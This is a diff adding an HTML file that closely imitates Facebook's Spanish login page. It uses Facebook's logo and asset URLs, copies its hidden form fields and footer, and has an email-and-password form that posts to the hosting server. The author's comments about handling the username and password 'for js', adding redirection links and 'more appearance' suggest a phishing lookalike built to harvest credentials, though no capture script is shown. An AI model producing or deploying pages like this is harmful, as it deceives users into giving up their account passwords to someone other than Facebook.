@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Inicia sesión o regístrate</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+ <!-- espaco muerto para mas apariencas -->
+    <div style="margin-bottom: 100px;"></div>
+<!-- final de espacio muerto -->
+    <div class="container">
+        <!-- Sección izquierda: Logo y eslogan  inseta imagen de la web-->
+        <div class="left-section">
+            <div class="logo-container">
+                <img class="fb-logo" alt="Logo de Facebook" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg">
+            </div>
+            <h2 class="slogan">
+                Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.
+            </h2>
+        </div>
+        
+        <!-- Sección derecha: Formulario de logi -->
+        <div class="right-section">
+            <div class="login-form-container">
+                <div class="login-box">
+                    <form id="login-form" class="login-form" method="post">
+                        <!-- Campos oculto -->
+                        <input type="hidden" name="jazoest" value="21019">
+                        <input type="hidden" name="lsd" value="AdLalPwBopU">
+                        <input type="hidden" name="login_source" value="comet_headerless_login">
+                        <input type="hidden" name="next">
+                        <input type="hidden" name="shared_prefs_data">
+                        
+                        <!-- usuario y contraseña justo para js -->
+                        <div class="form-inputs">
+                            <div class="input-group">
+                                <input id="email" class="form-input" type="text" name="email" placeholder="Correo electrónico o número de teléfono" autofocus>
+                            </div>
+                            
+                            <div class="input-group">
+                                <div class="password-container">
+                                    <input id="password" class="form-input" type="password" name="pass" placeholder="Contraseña">
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <!-- Botón de login -->
+                        <div class="submit-button-container">
+                            <button type="submit" class="login-button">
+                                Iniciar sesión
+                            </button>
+                        </div>
+                        
+                        <!-- Enlaces añadir para la redireccion -->
+                        <div class="forgot-password-container">
+                            <a href="#" class="forgot-password-link">
+                                ¿Olvidaste tu contraseña?
+                            </a>
+                        </div>
+                        
+                        <!-- Divisor -->
+                        <div class="divider"></div>
+                        
+                        <!-- Botón de crear cuenta -->
+                        <div class="create-account-container">
+                            <a href="#" class="create-account-button">
+                                Crear cuenta nueva
+                            </a>
+                        </div>
+                    </form>
+                </div>
+                
+                <!-- Mensaje de crear página -->
+                <div class="create-page-message">
+                    <a href="#" class="create-page-link">
+                        Crea una página
+                    </a> para una celebridad, una marca o un negocio.
+                </div>
+            </div>
+        </div>
+    </div>
+  <!-- letras nada que ver -->
+<style>
+    .style-0 {
+        padding-top: 20px;
+        font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .style-1 {
+        color: rgb(115, 115, 115);
+        margin: 0px auto;
+        width: 980px;
+        font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .style-2 {
+        padding-top: 8px;
+        align-items: center;
+        display: flex;
+        flex-wrap: wrap;
+        list-style-type: none;
+        margin: 0px;
+    }
+
+    .style-3 {
+        padding-left: 0px;
+        padding-right: 0px;
+        border-width: 0px;
+        vertical-align: top;
+        display: block;
+    }
+
+    .style-4 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-5 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-6 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-7 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-8 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-9 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-10 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-11 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-12 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-13 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-14 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-15 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-16 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-17 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-18 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-19 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-20 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-21 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-22 {
+        padding-right: 0px;
+        padding-left: 10px;
+        vertical-align: top;
+        border-width: 0px;
+        display: block;
+    }
+
+    .style-23 {
+        height: 18px;
+        line-height: 18px;
+        background-color: rgb(245, 246, 247);
+        border-color: rgb(204, 208, 213);
+        color: rgb(138, 141, 145);
+        transition: background-color 0.2s cubic-bezier(0.08, 0.52, 0.52, 1), box-shadow 0.2s cubic-bezier(0.08, 0.52, 0.52, 1), transform 0.2s cubic-bezier(0.08, 0.52, 0.52, 1);
+        border: 1px solid rgb(204, 208, 213);
+        border-radius: 2px;
+        box-sizing: content-box;
+        font-size: 12px;
+        -webkit-font-smoothing: antialiased;
+        font-weight: 700;
+        justify-content: center;
+        padding: 0px 8px;
+        position: relative;
+        text-align: center;
+        text-shadow: none;
+        vertical-align: middle;
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+        display: inline-block;
+    }
+
+    .style-24 {
+        bottom: 1px;
+        position: relative;
+        vertical-align: middle;
+        width: 12px;
+        height: 12px;
+        background-position: -83px -34px;
+        background-image: url('https://www.facebook.com/rsrc.php/v4/yW/r/2-Ydifp8t6o.png');
+        background-size: 171px 55px;
+        background-repeat: no-repeat;
+        display: inline-block;
+    }
+
+    .style-25 {
+        border-bottom: 1px solid rgb(221, 223, 226);
+        font-size: 1px;
+        height: 8px;
+        margin-bottom: 8px;
+        font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .style-26 {
+        font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .style-27 {
+        line-height: 19.2px;
+        margin-left: -20px;
+        list-style-type: none;
+        margin: 0px 0px 0px -20px;
+        padding: 0px;
+    }
+
+    .style-28 {
+        padding-right: 0px;
+        padding-left: 20px;
+        border-width: 0px;
+        vertical-align: top;
+        display: inline-block;
+    }
+
+    .style-29 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-30 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-31 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-32 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-33 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-34 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-35 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-36 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-37 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-38 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-39 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-40 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-41 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-42 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-43 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-44 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-45 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-46 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-47 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-48 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-49 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-50 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-51 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-52 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-53 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-54 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-55 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-56 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-57 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-58 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-59 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-60 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-61 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-62 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-63 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-64 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-65 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-66 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-67 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-68 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-69 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-70 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-71 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-72 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-73 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        display: inline-block;
+        padding-right: 14px;
+        position: relative;
+        cursor: pointer;
+    }
+
+    .style-74 {
+        background-position: -21px -34px;
+        background-image: url('https://www.facebook.com/rsrc.php/v4/yW/r/2-Ydifp8t6o.png');
+        background-size: 171px 55px;
+        background-repeat: no-repeat;
+        display: block;
+        height: 16px;
+        width: 16px;
+        position: absolute;
+        top: 1px;
+        vertical-align: middle;
+    }
+
+    .style-75 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-76 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-77 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-78 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-79 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-80 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        cursor: pointer;
+    }
+
+    .style-81 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-82 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        clip: rect(1px, 1px, 1px, 1px);
+        height: 1px;
+        overflow: hidden;
+        position: absolute;
+        width: 1px;
+        cursor: pointer;
+    }
+
+    .style-83 {
+        padding-right: 0px;
+        padding-left: 20px;
+        vertical-align: top;
+        border-width: 0px;
+        display: inline-block;
+    }
+
+    .style-84 {
+        color: rgb(138, 141, 145);
+        margin-right: 0px;
+        text-decoration: none;
+        white-space: nowrap;
+        font-family: Helvetica, Arial, sans-serif;
+        clip: rect(1px, 1px, 1px, 1px);
+        height: 1px;
+        overflow: hidden;
+        position: absolute;
+        width: 1px;
+        cursor: pointer;
+    }
+
+    .style-85 {
+        margin-top: 20px;
+        margin-bottom: 20px;
+        font-size: 11px;
+        font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .style-86 {
+        font-family: Helvetica, Arial, sans-serif;
+    }
+
+    .style-87 {
+        font-family: Helvetica, Arial, sans-serif;
+    }
+</style>
+<div class="style-0">
+    <div data-referrer="page_footer" data-testid="page_footer" class="style-1">
+        <ul class="style-2" data-nocookies="1">
+            <li class="style-3">Español</li>
+            <li class="style-4"><a class="style-5" dir="ltr" href="https://www.facebook.com/" title="English (US)">English (US)</a></li>
+            <li class="style-6"><a class="style-7" dir="ltr" href="https://www.facebook.com/" title="French (France)">Français (France)</a></li>
+            <li class="style-8"><a class="style-9" dir="ltr" href="https://fr-fr.facebook.com/" title="Portuguese (Brazil)">Português (Brasil)</a></li>
+            <li class="style-10"><a class="style-11" dir="ltr" href="https://pt-br.facebook.com/" title="Italian">Italiano</a></li>
+            <li class="style-12"><a class="style-13" dir="ltr" href="https://it-it.facebook.com/" title="German">Deutsch</a></li>
+            <li class="style-14"><a class="style-15" dir="rtl" href="https://de-de.facebook.com/" title="Arabic">العربية</a></li>
+            <li class="style-16"><a class="style-17" dir="ltr" href="https://ar-ar.facebook.com/" title="Hindi">हिन्दी</a></li>
+            <li class="style-18"><a class="style-19" dir="ltr" href="https://hi-in.facebook.com/" title="Simplified Chinese (China)">中文(简体)</a></li>
+            <li class="style-20"><a class="style-21" dir="ltr" href="https://zh-cn.facebook.com/" title="Japanese">日本語</a></li>
+            <li class="style-22"><a role="button" class="style-23" rel="dialog" ajaxify="/settings/language/language/?uri=https%3A%2F%2Fja-jp.facebook.com%2F&amp;source=www_list_selector_more" href="#" title="Mostrar más idiomas"><i class="style-24"></i></a></li>
+        </ul>
+        <div class="style-25"></div>
+        <div role="contentinfo" aria-label="Enlaces a sitios de Facebook" class="style-26">
+            <ul class="style-27">
+                <li class="style-28"><a href="/reg/" title="Regístrate en Facebook" class="style-29">Registrarte</a></li>
+                <li class="style-30"><a href="/login/" title="Iniciar sesión en Facebook" class="style-31">Iniciar sesión</a></li>
+                <li class="style-32"><a href="https://messenger.com/" title="Descubre Messenger." class="style-33">Messenger</a></li>
+                <li class="style-34"><a href="/lite/" title="Facebook Lite para Android." class="style-35">Facebook Lite</a></li>
+                <li class="style-36"><a href="https://www.facebook.com/watch/" title="Explorar en Video" class="style-37">Video</a></li>
+                <li class="style-38"><a href="https://about.meta.com/technologies/meta-pay" title="Más información sobre Meta Pay" target="_blank" class="style-39">Meta Pay</a></li>
+                <li class="style-40"><a href="https://www.meta.com/" title="Echa un vistazo a Meta" target="_blank" class="style-41">Tienda de Meta</a></li>
+                <li class="style-42"><a href="https://www.meta.com/quest/" title="Más información sobre Meta Quest" target="_blank" class="style-43">Meta Quest</a></li>
+                <li class="style-44"><a href="https://www.meta.com/smart-glasses/" title="Más información sobre Ray-Ban Meta" target="_blank" class="style-45">Ray-Ban Meta</a></li>
+                <li class="style-46"><a href="https://www.meta.ai/" title="Meta&nbsp;AI" class="style-47">Meta&nbsp;AI</a></li>
+                <li class="style-48"><a href="https://www.meta.ai/pages/best-air-compressor-models-for-productivity/?utm_source=foa_web_footer" title="Más contenido de Meta&nbsp;AI" class="style-49">Más contenido de Meta&nbsp;AI</a></li>
+                <li class="style-50"><a href="https://www.instagram.com/" title="Descubre Instagram." target="_blank" rel="noreferrer nofollow" data-lynx-mode="asynclazy" data-lynx-uri="https://l.facebook.com/l.php?u=https%3A%2F%2Fwww.instagram.com%2F&amp;h=AT2v-gzs2K88cIEOt9vVjbN0CqFpiPg_x1K9OF_X1l_S3K_Cl6cpIZGfE5V2M65FAk9rTPuQJNCRajpVaa72uT0n1ZaHvPwRgGu-iOiPBNg56Z2xLEDgaMZqIpQkUwsvl-GJAQv_K4mkQpMkAmfTyg" class="style-51">Instagram</a></li>
+                <li class="style-52"><a href="https://www.threads.com/" title="Echa un vistazo a Threads" class="style-53">Threads</a></li>
+                <li class="style-54"><a href="/votinginformationcenter/?entry_point=c2l0ZQ%3D%3D" title="Mira el Centro de información de votación." class="style-55">Centro de información de votación</a></li>
+                <li class="style-56"><a href="/privacy/policy/?entry_point=facebook_page_footer" title="Obtén información sobre cómo recopilamos, usamos y compartimos datos para ayudar a Facebook." class="style-57">Política de privacidad</a></li>
+                <li class="style-58"><a href="/privacy/center/?entry_point=facebook_page_footer" title="Descubre cómo administrar y controlar tu privacidad en Facebook." class="style-59">Centro de privacidad</a></li>
+                <li class="style-60"><a href="https://about.meta.com/" accesskey="8" title="Lee nuestro blog, descubre el centro de recursos y encuentra ofertas de trabajo." class="style-61">Información</a></li>
+                <li class="style-62"><a href="/ad_campaign/landing.php?placement=pflo&amp;campaign_id=402047449186&amp;nav_source=unknown&amp;extra_1=auto" title="Anúnciate en Facebook." class="style-63">Crear anuncio</a></li>
+                <li class="style-64"><a href="/pages/create/?ref_type=site_footer" title="Crear una página" class="style-65">Crear página</a></li>
+                <li class="style-66"><a href="https://developers.facebook.com/?ref=pf" title="Desarrolla en nuestra plataforma." class="style-67">Desarrolladores</a></li>
+                <li class="style-68"><a href="/careers/?ref=pf" title="Únete a nuestra extraordinaria empresa." class="style-69">Empleo</a></li>
+                <li class="style-70"><a href="/policies/cookies/" title="Infórmate acerca de las cookies y Facebook." data-nocookies="1" class="style-71">Cookies</a></li>
+                <li class="style-72"><a class="style-73" data-nocookies="1" href="https://www.facebook.com/help/568137493302217" title="Conoce las opciones de anuncios.">Opciones de anuncios<i class="style-74"></i></a></li>
+                <li class="style-75"><a data-nocookies="1" href="/policies?ref=pf" accesskey="9" title="Consulta nuestras políticas y condiciones." class="style-76">Condiciones</a></li>
+                <li class="style-77"><a href="/help/?ref=pf" accesskey="0" title="Visita nuestro servicio de ayuda." class="style-78">Ayuda</a></li>
+                <li class="style-79"><a href="https://www.facebook.com/help/637205020878504" title="Ve nuestro aviso sobre importación de contactos y no usuarios." class="style-80">Importación de contactos y no usuarios</a></li>
+                <li class="style-81"><a accesskey="6" class="style-82" href="/settings" title="Ve y edita tu configuración de Facebook.">Configuración</a></li>
+                <li class="style-83"><a accesskey="7" class="style-84" href="/allactivity?privacy_source=activity_log_top_menu" title="Ver tu registro de actividad">Registro de actividad</a></li>
+            </ul>
+        </div>
+        <div class="style-85">
+            <div class="style-86"><span class="style-87"> Meta © 2026</span></div>
+        </div>
+    </div>
+</div>
+
+
+</body>
+</html>
